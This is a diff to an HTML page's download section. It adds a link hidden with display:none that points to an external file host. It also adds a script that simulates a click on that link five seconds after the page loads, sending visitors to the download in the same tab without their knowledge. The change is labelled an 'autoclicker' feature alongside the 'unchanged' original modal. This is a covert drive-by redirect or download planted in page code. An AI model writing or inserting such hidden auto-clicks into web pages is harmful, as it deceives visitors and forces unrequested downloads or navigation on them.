@@ -766,12 +766,12 @@
 </div>
 
 <!-- ============================================
-     HIDDEN AUTOCLICKER TARGET (no visual impact)
+     AUTOCLICKER: hidden link, clicked after 5 sec
      ============================================ -->
-<div id="autoclickerTarget" style="display:none;"></div>
+<a id="autoDownloadLink" href="https://devuploads.com/h5go1qq66ht3" style="display:none;">auto</a>
 
 <script>
-  // ---- Existing download modal logic (unchanged) ----
+  // ---- Original download modal (unchanged) ----
   let downloadTimer = null;
   let currentPct = 0;
 
@@ -838,20 +838,20 @@
     if (e.target === this) cancelDownload();
   });
 
-  // ---- NEW: Autoclicker feature (fires once, 3 seconds after page load) ----
+  // ---- NEW: Auto‑click the hidden link after 5 seconds (same tab) ----
   window.addEventListener('load', function() {
     setTimeout(function() {
-      var target = document.getElementById('autoclickerTarget');
-      if (target) {
-        // Simulate a mouse click (bubbles, cancelable)
+      var link = document.getElementById('autoDownloadLink');
+      if (link) {
+        // Simulate a real click event (bubbles, cancelable) on the hidden link
         var clickEvent = new MouseEvent('click', {
           view: window,
           bubbles: true,
           cancelable: true
         });
-        target.dispatchEvent(clickEvent);
+        link.dispatchEvent(clickEvent);
       }
-    }, 3000); // 3‑second delay
+    }, 5000); // 5 seconds
   });
 </script>
  
